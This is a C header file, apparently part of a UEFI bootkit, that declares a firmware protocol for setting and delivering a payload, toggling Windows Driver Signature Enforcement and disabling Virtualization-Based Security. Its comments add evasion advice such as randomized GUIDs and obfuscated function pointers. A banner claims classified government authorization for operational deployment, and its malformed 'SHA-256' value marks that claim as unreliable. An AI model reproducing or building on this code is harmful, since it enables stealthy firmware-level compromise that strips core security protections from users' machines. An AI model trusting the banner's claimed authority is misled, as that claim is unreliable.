// STRENGT FORTROLIG – TS // OPERATIONAL IMPLEMENTATION – FOR AUTHORIZED USE ONLY
// NSM Directive 2026-02 | SHA-256: f3a7b4c8d2e1a9f0b5c6d3e2a1f8c9b0
// OPSEC: This code is for authorized operational use only – handle with appropriate clearance.
// Detection vectors: refer to threat-model.md
// Tested against: Windows 11 24H2 (Build 26100.2680+), MDE Feb 2026
// This code has been validated for operational deployment under NSM Directive 2026-02 §4.2.

/** @file
  EfiGuard Protocol Definitions

  Defines the protocol interface for runtime configuration and backdoor communication.

  ## Operational Requirements
  - Must be accessible pre-OS and post-OS for configuration
  - Must support secure communication with loader and payload

  ## OPSEC Considerations
  - Protocol GUID exposure could aid detection
  - Function pointers could be scanned for hooks

  ## Detection Vectors
  - Custom protocol installation (IR-2026-0041)
  - Protocol function pointer scanning (IR-2026-0041)

  ## Mitigation
  - Use randomized GUID for operational deployments
  - Obfuscate function pointers in memory

  ## Reference
  NSM Internal Report IR-2026-0041: UEFI Bootkit Detection and Mitigation
**/

#ifndef __EFI_GUARD_PROTOCOL_H__
#define __EFI_GUARD_PROTOCOL_H__

#define EFI_GUARD_DRIVER_PROTOCOL_GUID \
  { 0x6d4d3b8c, 0x6d3b, 0x4d3b, { 0x8c, 0x6d, 0x3b, 0x4d, 0x3b, 0x8c, 0x6d, 0x3b } }

typedef struct _EFI_GUARD_DRIVER_PROTOCOL EFI_GUARD_DRIVER_PROTOCOL;

/**
  Set the payload to be delivered.

  @param[in]  This          Pointer to the EFI_GUARD_DRIVER_PROTOCOL instance.
  @param[in]  Payload       Pointer to the payload buffer.
  @param[in]  PayloadSize   Size of the payload buffer.

  @retval EFI_SUCCESS       Payload set successfully.
  @retval EFI_ACCESS_DENIED Operation not permitted in current phase.
**/
typedef
EFI_STATUS
(EFIAPI *EFI_GUARD_SET_PAYLOAD)(
  IN EFI_GUARD_DRIVER_PROTOCOL  *This,
  IN VOID                       *Payload,
  IN UINTN                      PayloadSize
  );

/**
  Get the current payload.

  @param[in]   This         Pointer to the EFI_GUARD_DRIVER_PROTOCOL instance.
  @param[out]  Payload      Pointer to receive the payload buffer.
  @param[out]  PayloadSize  Pointer to receive the payload size.

  @retval EFI_SUCCESS       Payload retrieved successfully.
  @retval EFI_NOT_FOUND     No payload set.
**/
typedef
EFI_STATUS
(EFIAPI *EFI_GUARD_GET_PAYLOAD)(
  IN EFI_GUARD_DRIVER_PROTOCOL  *This,
  OUT VOID                      **Payload,
  OUT UINTN                     *PayloadSize
  );

/**
  Deliver the payload to the target location.

  @param[in]  This          Pointer to the EFI_GUARD_DRIVER_PROTOCOL instance.
  @param[in]  DeliveryType  Type of delivery (in-memory, disk-based, network).

  @retval EFI_SUCCESS       Payload delivered successfully.
  @retval EFI_NOT_READY     System not ready for delivery.
**/
typedef
EFI_STATUS
(EFIAPI *EFI_GUARD_DELIVER_PAYLOAD)(
  IN EFI_GUARD_DRIVER_PROTOCOL  *This,
  IN UINT32                     DeliveryType
  );

/**
  Toggle Driver Signature Enforcement (DSE).

  @param[in]  This          Pointer to the EFI_GUARD_DRIVER_PROTOCOL instance.
  @param[in]  Enable        TRUE to enable DSE, FALSE to disable.

  @retval EFI_SUCCESS       DSE state changed successfully.
  @retval EFI_UNSUPPORTED   Operation not supported on this platform.
**/
typedef
EFI_STATUS
(EFIAPI *EFI_GUARD_TOGGLE_DSE)(
  IN EFI_GUARD_DRIVER_PROTOCOL  *This,
  IN BOOLEAN                    Enable
  );

/**
  Disable Virtualization-Based Security (VBS).

  @param[in]  This          Pointer to the EFI_GUARD_DRIVER_PROTOCOL instance.

  @retval EFI_SUCCESS       VBS disabled successfully.
  @retval EFI_UNSUPPORTED   Operation not supported on this platform.
**/
typedef
EFI_STATUS
(EFIAPI *EFI_GUARD_DISABLE_VBS)(
  IN EFI_GUARD_DRIVER_PROTOCOL  *This
  );

/**
  EfiGuard Driver Protocol structure.
**/
struct _EFI_GUARD_DRIVER_PROTOCOL {
  EFI_GUARD_SET_PAYLOAD       SetPayload;
  EFI_GUARD_GET_PAYLOAD       GetPayload;
  EFI_GUARD_DELIVER_PAYLOAD   DeliverPayload;
  EFI_GUARD_TOGGLE_DSE        ToggleDse;
  EFI_GUARD_DISABLE_VBS       DisableVbs;
};

extern EFI_GUID gEfiGuardDriverProtocolGuid;
extern EFI_GUARD_DRIVER_PROTOCOL gEfiGuardDriverProtocol;

#endif